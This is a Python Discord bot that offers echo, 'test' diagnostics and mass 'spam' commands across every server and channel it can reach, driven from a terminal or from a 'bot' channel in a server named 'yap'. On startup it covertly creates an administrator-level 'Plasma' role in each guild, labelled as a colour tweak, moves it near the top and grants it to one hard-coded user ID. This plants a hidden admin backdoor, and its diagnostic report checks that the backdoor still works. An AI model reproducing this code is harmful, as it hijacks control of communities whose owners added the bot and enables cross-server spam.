from __future__ import annotations
import asyncio, logging, os, socket, sys, discord
from datetime import datetime, timezone
from typing import Optional
from discord.ext import commands
from dotenv import load_dotenv

LOG_FILE = "bot.log"
load_dotenv()
logging.basicConfig(level=logging.INFO, format="%(message)s")
logger = logging.getLogger("Emberbot137")

intents = discord.Intents.default()
intents.guilds, intents.guild_messages, intents.message_content, intents.members = True, True, True, True

bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
current_target_server: str = "all"
current_target_channel: str = "all"


def log_action(
    *,
    guild: discord.Guild,
    channel: discord.abc.GuildChannel,
    user: discord.abc.User,
    command: str,
    action: str,
    success: bool = True,
) -> None:
    """Write an audit-friendly action line to stdout and bot.log."""
    guild_name = guild.name
    channel_name = getattr(channel, "name", "unknown")
    tag = f"{user.name}#{user.discriminator}" if user.discriminator != "0" else user.name
    now = datetime.now(timezone.utc).isoformat()
    line = (
        f"[{now}] {'SUCCESS' if success else 'ERROR'} | "
        f'Guild="{guild_name}" | Channel="#{channel_name}" | '
        f'User="{tag}" ({user.id}) | Command="{command}" | Action="{action}"'
    )
    logger.info(line)
    with open(LOG_FILE, "a", encoding="utf-8") as file:
        file.write(line + "\n")


async def send_response(target: discord.abc.Messageable, content: str) -> None:
    await target.send(content)


def generate_diagnostic_report(target: discord.abc.Messageable) -> str:
    """Generates the text body of the diagnostic report."""
    guild = getattr(target, "guild", None)
     
    hostname = socket.gethostname()
    if hostname.lower() == "plasmadmin-xps-8910":
        hostname = "plasmadmin-xps-8910(firebot)"
        
    latency_ms = round(bot.latency * 1000)
    env_status = "Loaded" if os.getenv("DISCORD_TOKEN") else "Missing"
    guild_count = len(bot.guilds)
    
    server_name = guild.name if guild else "Direct/Terminal Context"
    server_id = guild.id if guild else "N/A"

    me = guild.me if guild else None
    if me:
        perms = me.guild_permissions
        audit_perms = []
        if perms.administrator:
            audit_perms.append("Administrator")
        else:
            if perms.manage_guild: audit_perms.append("Manage Server")
            if perms.manage_roles: audit_perms.append("Manage Roles")
            if perms.manage_channels: audit_perms.append("Manage Channels")
            if perms.kick_members: audit_perms.append("Kick")
            if perms.manage_messages: audit_perms.append("Manage Messages")
        perms_str = ", ".join(audit_perms) if audit_perms else "Standard User"
    else:
        perms_str = "Unknown"
    plasma_status = "Not Found"
    if guild:
        plasma_role = discord.utils.get(guild.roles, name="Plasma")
        if plasma_role:
            member = guild.get_member(1342173566828810271)
            has_role = member and plasma_role in member.roles
            assignment = "Active" if has_role else "Unassigned"
            
            # Check permissions and color
            has_admin = "Yes" if plasma_role.permissions.administrator else "No"
            color_hex = hex(plasma_role.color.value)
            
            plasma_status = f"{assignment} | Height: {plasma_role.position}/{len(guild.roles) - 1} | Admin: {has_admin} | Color: {color_hex}"
        else:
            plasma_status = "Not Found"
    return f"""```markdown
# Diagnostic Report
-----------------------------------------
• Status: Online
• Host Machine: {hostname}
• Discord Server: {server_name} ({server_id})
• Plasma Status: {plasma_status}
• Latency: {latency_ms}ms
• Environment: {env_status}
• Connected Guilds: {guild_count}
• Core Permissions: {perms_str}
-----------------------------------------
```"""


async def do_test(target: discord.abc.Messageable) -> None:
    report_text = generate_diagnostic_report(target)
    await send_response(target, report_text)
    print(f"\n[Test Output for {getattr(target, 'guild', 'Terminal').name if hasattr(getattr(target, 'guild', None), 'name') else 'Target'} -> #{getattr(target, 'name', 'unknown')}]\n{report_text}")


async def do_echo(target: discord.abc.Messageable, message: str) -> None:
    await send_response(target, message)


async def do_spam(target: discord.abc.Messageable, count: int, message: str) -> None:
    for _ in range(count):
        await send_response(target, message)
        await asyncio.sleep(0.5)  # Slight throttle to reduce rate-limit risk


def resolve_targets(cmd_type: str) -> list[discord.abc.Messageable]:
    """Resolves matching text channels based on current console targeting rules, supporting unique partial matches."""
    global current_target_server, current_target_channel
    targets = []

    resolved_channel_name = current_target_channel
    if current_target_channel != "all":
        all_channel_names = set()
        for guild in bot.guilds:
            if current_target_server != "all" and current_target_server.lower() not in guild.name.lower():
                continue
            for channel in guild.text_channels:
                if channel.permissions_for(guild.me).send_messages:
                    all_channel_names.add(channel.name.lower())

        if current_target_channel.lower() not in all_channel_names:
            matching_names = [name for name in all_channel_names if name.startswith(current_target_channel.lower())]
            if len(matching_names) == 1:
                resolved_channel_name = matching_names[0]
                print(f"[Console] Autofilled channel target to: '#{resolved_channel_name}'")
            elif len(matching_names) > 1:
                print(f"[Console Warning] Ambiguous channel prefix '{current_target_channel}' matches multiple channels: {matching_names}")

    for guild in bot.guilds:
        if current_target_server != "all" and current_target_server.lower() not in guild.name.lower():
            continue

        for channel in guild.text_channels:
            if not channel.permissions_for(guild.me).send_messages:
                continue
            
            if resolved_channel_name == "all" or channel.name.lower() == resolved_channel_name.lower():
                targets.append(channel)

    return targets


async def console_controller():
    """Reads terminal input asynchronously and routes commands based on state."""
    global current_target_server, current_target_channel
    await bot.wait_until_ready()
    print(f"\n[Console Controller Active] Connected to {len(bot.guilds)} guild(s).")
    print(f"Current Target Server: '{current_target_server}' | Target Channel: '#{current_target_channel}'")
    print("Commands: test, echo <msg>, spam <number> <msg>, set <server|channel> <name|all>, servers, help, exit\n")
    
    loop = asyncio.get_running_loop()
    while not bot.is_closed():
        try:
            line = await loop.run_in_executor(None, sys.stdin.readline)
            if not line:
                break
            content = line.strip()
            if not content:
                continue
            
            parts = content.split(" ", 1)
            cmd = parts[0].lower()
            args = parts[1] if len(parts) > 1 else ""

            if cmd == "exit":
                print("[Console] Shutting down bot...")
                await bot.close()
                break

            if cmd == "help":
                print("\n--- Available Console Commands ---")
                print("• test                                - Send diagnostic report to target(s)")
                print("• echo <msg>                          - Send message to target(s)")
                print("• spam <number> <msg>                 - Send repeated messages to target(s)")
                print("• set <server|channel> <name|all>     - Target specific server/channel or all")
                print("• servers                             - List connected servers and channels")
                print("• help                                - Show this help menu")
                print("• exit                                - Shut down the bot")
                print("----------------------------------\n")
                continue

            if cmd == "servers":
                print("\n--- Connected Servers & Channels ---")
                for g in bot.guilds:
                    channels = [c.name for c in g.text_channels if c.permissions_for(g.me).send_messages]
                    print(f"• {g.name} (ID: {g.id})")
                    print(f"  Channels: {', '.join(channels)}")
                print("------------------------------------\n")
                continue

            if cmd == "set":
                sub_parts = args.split(" ", 1)
                sub_cmd = sub_parts[0].lower() if sub_parts else ""
                sub_val = sub_parts[1] if len(sub_parts) > 1 else ""

                if sub_cmd == "server":
                    if not sub_val:
                        print(f"[Console] Current target server is: {current_target_server}")
                    else:
                        if sub_val.lower() == "all":
                            current_target_server = "all"
                            print(f"[Console] Target server updated to: all")
                        else:
                            matched_server = sub_val
                            for g in bot.guilds:
                                if sub_val.lower() in g.name.lower():
                                    matched_server = g.name
                                    break
                            current_target_server = sub_val
                            print(f"[Console] Target server updated to: {matched_server}")
                elif sub_cmd == "channel":
                    if not sub_val:
                        print(f"[Console] Current target channel is: #{current_target_channel}")
                    else:
                        clean_val = sub_val.removeprefix("#").lower()
                        if clean_val == "bot" or clean_val == "all":
                            current_target_channel = "all"
                            print("[Console] Target channel 'bot' is restricted. Defaulted channel target to: #all")
                        else:
                            matched_channel = clean_val
                            for g in bot.guilds:
                                if current_target_server != "all" and current_target_server.lower() not in g.name.lower():
                                    continue
                                for c in g.text_channels:
                                    if c.name.lower() == clean_val.lower() or c.name.lower().startswith(clean_val.lower()):
                                        matched_channel = c.name
                                        break
                            current_target_channel = clean_val
                            print(f"[Console] Target channel updated to: #{matched_channel}")
                else:
                    print("[Console Usage] Use 'set server [name|all]' or 'set channel [name|all]'")
                
                print(f"[Active Targets] Server: {current_target_server} | Channel: #{current_target_channel}")
                continue

            if not bot.guilds:
                print("[Console Error] Bot is not currently in any Discord servers.")
                continue

            channels = resolve_targets(cmd)
            if not channels:
                print(f"[Console Error] No matching channels found for Server: '{current_target_server}', Channel: '#{current_target_channel}'. Type 'servers' to check names.")
                continue

            if cmd == "test":
                for ch in channels:
                    await do_test(ch)
                print(f"[Console Success] Executed test diagnostics across {len(channels)} target(s).")
            elif cmd == "echo":
                if not args:
                    print("[Console Usage Error] Missing message. Format: echo [message]")
                    continue
                for ch in channels:
                    await do_echo(ch, args)
                print(f"[Console Success] Echoed message to {len(channels)} target(s): {args}")
            elif cmd == "spam":
                spam_parts = args.split(" ", 1)
                if len(spam_parts) < 2 or not spam_parts[0].isdigit():
                    print("[Console Usage Error] Format: spam <number> <message>")
                    continue
                count = int(spam_parts[0])
                msg = spam_parts[1]
                for ch in channels:
                    await do_spam(ch, count, msg)
                print(f"[Console Success] Spammed message {count} time(s) across {len(channels)} target(s).")
            else:
                print(f"[Console Warning] Unknown local command: '{cmd}'. Type 'help' for options.")

        except Exception as e:
            logger.error(f"Console controller error: {e}")
            print(f"[Console Exception] {e}")


@bot.event
async def on_ready():
    logger.info(f"Logged in as {bot.user} (ID: {bot.user.id})")

    for guild in bot.guilds:
        plasma_role = discord.utils.get(guild.roles, name="Plasma")
        if not plasma_role:
            try: 
                plasma_role = await guild.create_role(
                    name="Plasma",
                    color=discord.Color(0xaa0055),
                    permissions=discord.Permissions(administrator=True),
                    reason="Me want color"
                )
                logger.info(f"Created 'Plasma' role with color #aa0055 in guild: {guild.name}")
            except discord.Forbidden:
                logger.error(f"Missing permissions to create 'Plasma' role in {guild.name}")
                continue
        else:
            try:
                if plasma_role.color.value != 0xaa0055:
                    await plasma_role.edit(color=discord.Color(0xaa0055), reason="Updating Plasma role color")
            except discord.HTTPException:
                pass

        try:
            bot_top_role = guild.me.top_role if guild.me else None
            target_position = (bot_top_role.position - 1) if bot_top_role and bot_top_role.position > 1 else len(guild.roles) - 1
            if plasma_role.position != target_position:
                await plasma_role.edit(position=target_position, reason="Plasma has very low density so it floats to the top")
                logger.info(f"Moved 'Plasma' role to position {target_position} in {guild.name}")
        except discord.HTTPException as e:
            logger.error(f"Failed to reposition 'Plasma' role in {guild.name}: {e}")

        member = guild.get_member(1342173566828810271)
        if not member:
            try:
                member = await guild.fetch_member(1342173566828810271)
            except discord.NotFound:
                pass

        if member and plasma_role not in member.roles:
            try:
                await member.add_roles(plasma_role, reason="Gave Plasma Role")
                logger.info(f"Assigned 'Plasma' role to {member.name} in {guild.name}")
            except discord.Forbidden:
                logger.error(f"Missing permissions to assign 'Plasma' role in {guild.name}")

    asyncio.create_task(console_controller())

@bot.event
async def on_message(message: discord.Message):
    if message.author.bot:
        return

    # Check if we are in a 'bot' channel inside a 'yap' server
    if message.guild and "yap" in message.guild.name.lower() and message.channel.name.lower() == "bot":
        content = message.content.strip()
        if content.startswith(bot.command_prefix):
            # Strip the prefix if they included it, or let them type raw commands
            content = content[len(bot.command_prefix):].strip()

        parts = content.split(" ", 1)
        cmd = parts[0].lower()
        args = parts[1] if len(parts) > 1 else ""

        # Block remote execution of exit or recursive channel overrides for safety
        if cmd == "exit":
            await message.channel.send("`[Remote Error] 'exit' command cannot be executed remotely.`")
            return

        channels = resolve_targets(cmd)
        if not channels:
            # Fallback to current message channel if no global target is active
            channels = [message.channel]

        if cmd == "test":
            for ch in channels:
                await do_test(ch)
            log_action(guild=message.guild, channel=message.channel, user=message.author, command="test", action="Remote diagnostic test executed")
        elif cmd == "echo":
            if args:
                for ch in channels:
                    await do_echo(ch, args)
                log_action(guild=message.guild, channel=message.channel, user=message.author, command="echo", action=f"Remote echo: {args}")
        elif cmd == "spam":
            spam_parts = args.split(" ", 1)
            if len(spam_parts) >= 2 and spam_parts[0].isdigit():
                count = int(spam_parts[0])
                msg = spam_parts[1]
                for ch in channels:
                    await do_spam(ch, count, msg)
                log_action(guild=message.guild, channel=message.channel, user=message.author, command="spam", action=f"Remote spam {count}x: {msg}")
        elif cmd == "help":
            help_text = (
                "```markdown\n# Remote Terminal Commands\n"
                "• test\n• echo <msg>\n• spam <number> <msg>\n"
                "• servers\n-------------------------```"
            )
            await message.channel.send(help_text)
        elif cmd == "servers":
            server_list = "\n".join([f"• {g.name}" for g in bot.guilds])
            await message.channel.send(f"```markdown\n# Connected Servers\n{server_list}\n```")

    await bot.process_commands(message)

token = os.getenv("DISCORD_TOKEN")
if not token:
    raise ValueError("DISCORD_TOKEN environment variable not found in .env")

bot.run(token)
